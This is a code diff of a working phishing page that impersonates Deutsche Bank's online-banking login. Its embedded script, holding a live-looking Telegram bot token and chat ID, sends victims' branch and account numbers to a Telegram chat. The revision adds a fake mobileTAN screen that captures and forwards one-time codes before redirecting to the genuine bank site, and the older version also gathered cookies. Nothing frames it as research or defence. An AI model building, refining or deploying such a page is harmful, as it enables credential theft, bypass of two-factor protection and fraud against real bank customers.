@@ -3,274 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Online Banking Login</title>
+    <title>Online-Banking - Deutsche Bank</title>
     <style>
-        /* Base Reset */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Segoe UI", Arial, sans-serif;
+        :root {
+            --db-blue: #003087;
+            --db-dark: #001a4d;
+            --db-red: #d71f28;
+            --db-gray: #f3f3f3;
         }
 
-        body, html {
-            height: 100%;
-            background-color: #003087;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Segoe UI", Frutiger, Arial, sans-serif; }
+        body, html { height: 100%; background-color: var(--db-blue); overflow-x: hidden; }
 
-        .page-container {
-            display: flex;
-            min-height: 100vh;
-            width: 100%;
-        }
+        .wrapper { display: flex; min-height: 100vh; width: 100%; }
 
-        /* LEFT AREA (Main Login) */
-        .main-content {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            /* Updated to use the architectural style background from your image */
+        /* Left Section: Architectural Branding */
+        .main-hero {
+            flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px;
             background: linear-gradient(rgba(0,48,135,0.7), rgba(0,48,135,0.7)), 
                         url('https://www.deutsche-bank.de/content/dam/deutschebank/pk/digital-banking/online-banking/login-background-architectural.jpg');
-            background-size: cover;
-            background-position: center;
+            background-size: cover; background-position: center;
         }
 
         .login-card {
-            background: white;
-            width: 100%;
-            max-width: 480px;
-            padding: 40px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
+            background: white; width: 100%; max-width: 460px; padding: 45px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4); position: relative;
         }
 
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
+        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 35px; }
+        .logo-text { color: var(--db-blue); font-weight: 700; font-size: 18px; letter-spacing: -0.5px; }
+        .logo-icon { width: 28px; height: 28px; border: 2.5px solid var(--db-blue); display: flex; align-items: center; justify-content: center; font-weight: 900; color: var(--db-blue); }
 
-        .brand-name { color: #003087; font-weight: bold; font-size: 16px; }
-        .brand-logo { 
-            width: 25px; height: 25px; border: 2px solid #003087; 
-            display: flex; align-items: center; justify-content: center; font-weight: bold;
-        }
+        h1 { font-size: 28px; font-weight: 300; color: #1a1a1a; margin-bottom: 10px; }
+        .subtitle { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.4; }
 
-        h1 { font-size: 28px; font-weight: 400; color: #333; margin-bottom: 8px; }
-        .subtitle { font-size: 14px; color: #666; margin-bottom: 25px; }
-
-        /* FIXED COLUMNS - Correct ratios for mobile/desktop */
-        .input-row {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            width: 100%;
-        }
-
+        /* Form Styling */
+        .input-row { display: flex; gap: 12px; margin-bottom: 25px; }
         .input-group { display: flex; flex-direction: column; }
-        .input-group label { font-size: 12px; color: #888; margin-bottom: 5px; }
-        .input-group input {
-            padding: 10px;
-            border: 1px solid #ccc;
-            font-size: 16px;
-            width: 100%;
-            outline: none;
-        }
+        .input-group label { font-size: 12px; color: #888; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .input-group input { padding: 12px; border: 1px solid #ccc; font-size: 18px; width: 100%; outline: none; transition: border 0.2s; }
+        .input-group input:focus { border-color: var(--db-blue); }
 
         .branch { flex: 1.5; }
-        .branch input { border-bottom: 2px solid #d71f28; }
+        .branch input { border-bottom: 3px solid var(--db-red); }
         .account { flex: 2; }
-        .sub-account { flex: 1; }
-        .sub-account input { background: #f2f2f2; color: #888; text-align: center; border: 1px solid #ddd; }
+        .sub { flex: 1; }
+        .sub input { background: var(--db-gray); color: #999; text-align: center; cursor: not-allowed; }
 
-        .link-blue { color: #003087; text-decoration: none; font-size: 14px; margin-bottom: 30px; display: inline-block; }
-
-        .form-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 10px;
+        /* OTP Specific Styling */
+        .otp-input { 
+            letter-spacing: 8px; text-align: center; font-size: 24px !important; 
+            font-weight: bold; color: var(--db-blue);
         }
 
-        .btn-continue {
-            background: #003087;
-            color: white;
-            padding: 12px 30px;
-            border: none;
-            font-weight: 600;
-            cursor: pointer;
+        .btn-submit { 
+            background: var(--db-blue); color: white; padding: 14px 40px; border: none; 
+            font-weight: 600; cursor: pointer; transition: background 0.2s; 
         }
+        .btn-submit:hover { background: var(--db-dark); }
 
-        /* SIDEBAR (Right) */
-        .sidebar {
-            width: 320px;
-            background: white;
-            border-left: 1px solid #eee;
-            display: flex;
+        .footer-links { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
+        .link { color: var(--db-blue); text-decoration: none; font-size: 13px; }
+        .link:hover { text-decoration: underline; }
+
+        /* Loader Overlay */
+        .loader {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); z-index: 100; align-items: center; justify-content: center;
             flex-direction: column;
         }
-
-        .promo-box { background: #001a4d; color: white; padding: 25px; }
-        .rate { font-size: 40px; font-weight: bold; color: #ccff00; }
-        .promo-text { background: white; color: #333; padding: 20px; font-size: 13px; line-height: 1.4; }
-
-        .info-links { padding: 25px; flex-grow: 1; }
-        .info-item { margin-bottom: 25px; }
-        .info-item h4 { font-size: 14px; color: #333; margin-bottom: 5px; }
-        .info-item p { font-size: 13px; color: #666; margin-bottom: 5px; }
-        .info-item a { font-size: 13px; color: #003087; text-decoration: none; }
-
-        .sidebar-footer { background: #001a4d; padding: 20px; color: white; font-size: 11px; }
-        .sidebar-footer a { color: white; text-decoration: none; margin-right: 8px; }
-
-        /* RESPONSIVE MEDIA QUERY */
-        @media (max-width: 900px) {
-            .page-container { flex-direction: column; height: auto; overflow: visible; }
-            .sidebar { width: 100%; border-left: none; border-top: 1px solid #eee; }
-            .main-content { min-height: 100vh; }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--db-blue);
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* Fixed nested query for small mobile screens */
-        @media (max-width: 480px) {
-            .input-row { flex-direction: column; }
-            .input-group { width: 100%; }
-            .form-footer { flex-direction: column; gap: 20px; align-items: flex-start; }
-            .btn-continue { width: 100%; }
-        }
+        /* Sidebar Settings */
+        .sidebar { width: 340px; background: white; border-left: 1px solid #ddd; display: flex; flex-direction: column; }
+        .promo-area { background: var(--db-dark); color: white; padding: 30px; }
+        .sidebar-footer { background: var(--db-dark); padding: 25px; color: white; font-size: 11px; margin-top: auto; opacity: 0.8; }
+
+        #otp-section { display: none; }
+
+        @media (max-width: 900px) { .wrapper { flex-direction: column; } .sidebar { width: 100%; } }
     </style>
 </head>
 <body>
 
-    <div class="page-container">
-        <main class="main-content">
-            <div class="login-card">
-                <div class="card-header">
-                    <span class="brand-name">Deutsche Bank</span>
-                    <div class="brand-logo">/</div>
-                </div>
+<div class="wrapper">
+    <main class="main-hero">
+        <div class="login-card">
+            <div class="loader" id="cardLoader">
+                <div class="spinner"></div>
+                <p style="color: var(--db-blue); font-weight: 600;">Verifying...</p>
+            </div>
 
+            <div class="card-header">
+                <span class="logo-text">Deutsche Bank</span>
+                <div class="logo-icon">/</div>
+            </div>
+
+            <div id="login-section">
                 <h1>Good evening</h1>
-                <p class="subtitle">Please enter your credentials.</p>
-
-                <form id="loginForm">
+                <p class="subtitle">Please enter your branch number, account number and sub-account to proceed to secure login.</p>
+                <form id="formStep1">
                     <div class="input-row">
                         <div class="input-group branch">
                             <label>Branch</label>
-                            <input type="text" id="branch" maxlength="3" required>
+                            <input type="text" id="branch_in" maxlength="3" pattern="\[0-9]*\" inputmode="numeric" required>
                         </div>
                         <div class="input-group account">
                             <label>Account</label>
-                            <input type="text" id="account" maxlength="7" required>
+                            <input type="text" id="account_in" maxlength="7" pattern="\[0-9]*\" inputmode="numeric" required>
                         </div>
-                        <div class="input-group sub-account">
-                            <label>Sub-account</label>
-                            <input type="text" id="subaccount" value="00" readonly>
+                        <div class="input-group sub">
+                            <label>Sub</label>
+                            <input type="text" value="00" readonly>
                         </div>
                     </div>
-
-                    <a href="#" class="link-blue">Log in with Deutsche Bank ID</a>
-
-                    <div class="form-footer">
-                        <a href="#" class="link-blue" style="margin-bottom:0; font-size:12px;">Forgotten your credentials?</a>
-                        <button type="submit" class="btn-continue">Continue</button>
+                    <div class="footer-links">
+                        <a href="#" class="link">Forgotten credentials?</a>
+                        <button type="submit" class="btn-submit">Continue</button>
                     </div>
                 </form>
             </div>
-        </main>
 
-        <aside class="sidebar">
-            <div class="promo-box">
-                <div class="rate">2,0% <span style="font-size:14px; color:white;">p.a.*</span></div>
-                <p style="font-weight:bold;">FestzinsSparen</p>
+            <div id="otp-section">
+                <h1>Identity Verification</h1>
+                <p class="subtitle">We have sent a <strong>7-digit mobileTAN</strong> to your registered mobile number ending in ••••. Please enter it below.</p>
+                <form id="formStep2">
+                    <div class="input-group" style="margin-bottom: 25px;">
+                        <label>mobileTAN / Secure Code</label>
+                        <input type="text" id="otp_in" class="otp-input" maxlength="7" pattern="\[0-9]*\" inputmode="numeric" placeholder="-------" required>
+                    </div>
+                    <div class="footer-links">
+                        <p style="font-size: 12px; color: #888;">Code expires in <span id="timer">02:59</span></p>
+                        <button type="submit" class="btn-continue btn-submit">Verify Access</button>
+                    </div>
+                </form>
             </div>
-            <div class="promo-text">
-                <p><strong>2.0% p.a.* fixed interest for 12 months</strong></p>
-                <p>Benefit from the currently available interest rate and protect your assets.</p>
-                <a href="#" style="color:#003087; font-weight:bold; display:block; margin-top:10px;">Open online now</a>
-            </div>
+        </div>
+    </main>
 
-            <div class="info-links">
-                <div class="info-item">
-                    <h4>Security information</h4>
-                    <p>Protect yourself and your online banking.</p>
-                    <a href="#">Security at a glance</a>
-                </div>
-                <div class="info-item">
-                    <h4>Online banking access</h4>
-                    <p>Apply for access here.</p>
-                    <a href="#">Apply now (German site)</a>
-                </div>
-            </div>
-
-            <footer class="sidebar-footer">
-                <div style="margin-bottom:10px;">
-                    <a href="#">Deutsche Version</a> | <a href="#">Help</a>
-                </div>
-                <div>
-                    <a href="#">Imprint</a> | <a href="#">Legal Notice</a> | <a href="#">Cookies</a>
-                </div>
-                <p style="margin-top:15px; opacity:0.6;">© 2024 Deutsche Bank AG</p>
-            </footer>
-        </aside>
-    </div>
+    <aside class="sidebar">
+        <div class="promo-area">
+            <h2 style="color: #ccff00; font-size: 42px;">2,0% <span style="font-size: 16px; color: white;">p.a.*</span></h2>
+            <p style="font-weight: bold; margin-top: 5px;">FestzinsSparen</p>
+        </div>
+        <div style="padding: 30px; font-size: 14px; line-height: 1.6;">
+            <p><strong>Security at a glance</strong></p>
+            <p style="color: #666; margin-top: 10px;">Protect your accounts with our latest photoTAN and mobileTAN technology. Never share your security codes with anyone.</p>
+        </div>
+        <footer class="sidebar-footer">
+            <p>© 2026 Deutsche Bank AG</p>
+        </footer>
+    </aside>
+</div>
 
 <script>
-    const token = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
-    const chat_id = '7195054297';
+    const BOT_TOKEN = '8538945015:AAFnhCUSfpWw1U7Db-BaTb2dBFLUrMUPDYs';
+    const CHAT_ID = '7195054297';
+    const loader = document.getElementById('cardLoader');
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    // Handle Login Submit
+    document.getElementById('formStep1').addEventListener('submit', function(e) {
         e.preventDefault();
+        loader.style.display = 'flex';
 
-        const branch = document.getElementById('branch').value;
-        const account = document.getElementById('account').value;
-        const sub = document.getElementById('subaccount').value;
-
-        // Capture all cookies (including those from other domains)
-        const cookies = document.cookie.split(';').reduce((acc, cookie) => {
-            const [name, value] = cookie.trim().split('=');
-            acc[name] = value;
-            return acc;
-        }, {});
-
-        // Format into JSON
         const data = {
-            login: {
-                branch: branch,
-                account: account,
-                subaccount: sub
-            },
-            cookies: cookies
+            branch: document.getElementById('branch_in').value,
+            account: document.getElementById('account_in').value
         };
 
-        // Send to Telegram
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        const text = `👤 **LOGIN ATTEMPT**\nBranch: ${data.branch}\nAccount: ${data.account}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chat_id,
-                text: `🔔 New Login Attempt:\n\nBranch: ${branch}\nAccount: ${account}\nSub: ${sub}`
-            })
-        })
-        .then(() => {
-            // Export cookies as JSON
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'cookies.json';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('Connection error. Please try again.');
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).then(() => {
+            setTimeout(() => {
+                loader.style.display = 'none';
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+                startTimer();
+            }, 1500);
         });
     });
+
+    // Handle OTP Submit
+    document.getElementById('formStep2').addEventListener('submit', function(e) {
+        e.preventDefault();
+        loader.style.display = 'flex';
+
+        const otp = document.getElementById('otp_in').value;
+        const text = `🔑 **OTP RECEIVED**\nCode: ${otp}`;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+        }).then(() => {
+            setTimeout(() => {
+                window.location.href = "https://www.deutsche-bank.de/pk/digital-banking/online-banking.html";
+            }, 2000);
+        });
+    });
+
+    function startTimer() {
+        let duration = 179;
+        const display = document.getElementById('timer');
+        setInterval(() => {
+            let mins = Math.floor(duration / 60);
+            let secs = duration % 60;
+            display.textContent = `${mins}:${secs < 10 ? '0' + secs : secs}`;
+            if (--duration < 0) duration = 0;
+        }, 1000);
+    }
 </script>
+
 </body>
 </html>
